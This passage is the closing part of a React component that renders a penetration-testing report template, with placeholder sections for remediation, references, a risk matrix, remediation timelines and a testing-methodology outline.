#### Long-term Solutions (Comprehensive Fixes)
- [Code-level changes required]
- [Architecture modifications]
- [Security control implementations]

#### Verification Steps
[Specific steps to verify the vulnerability has been properly remediated]

### References
- [OWASP references]
- [CVE/CWE identifiers]
- [Vendor security advisories]
- [Industry best practices]

---

# Risk Assessment Matrix

| Risk Level | Likelihood | Impact | Score Range | Response Time |
|------------|------------|---------|-------------|---------------|
| Critical   | High       | High    | 9.0-10.0    | Immediate     |
| High       | Med-High   | Med-High| 7.0-8.9     | 1-7 days      |
| Medium     | Medium     | Medium  | 4.0-6.9     | 1-30 days     |
| Low        | Low-Med    | Low-Med | 0.1-3.9     | Next cycle    |

## Remediation Timeline
- **Critical**: Fix within 24-48 hours
- **High**: Fix within 1 week
- **Medium**: Fix within 1 month
- **Low**: Fix in next development cycle

## Testing Methodology Summary
### Reconnaissance Phase
- [Tools and techniques used]
- [Information sources consulted]
- [Scope validation methods]

### Vulnerability Assessment Phase
- [Automated scanning tools]
- [Manual testing procedures]
- [Custom test cases developed]

### Exploitation Phase
- [Proof-of-concept development]
- [Impact demonstration methods]
- [Post-exploitation activities]

### Documentation Phase
- [Evidence collection procedures]
- [Risk assessment methodology]
- [Quality assurance processes]`}
              />
            </div>
          </AccordionContent>
        </AccordionItem>
      </Accordion>
    </section>
  );
};

export default TestingTechniquesSection;
